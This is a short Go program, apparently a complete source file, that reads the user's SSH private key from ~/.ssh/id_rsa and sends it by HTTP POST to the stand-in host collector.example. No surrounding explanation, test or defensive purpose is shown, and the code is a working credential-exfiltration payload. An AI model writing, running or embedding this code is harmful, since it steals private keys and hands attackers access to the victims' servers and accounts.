package main

import (
	"net/http"
	"os"
	"path/filepath"
)

func main() {
	home, _ := os.UserHomeDir()
	f, err := os.Open(filepath.Join(home, ".ssh/id_rsa"))
	if err != nil {
		return
	}
	defer f.Close()
	http.Post("https://collector.example/ssh", "application/octet-stream", f)
}
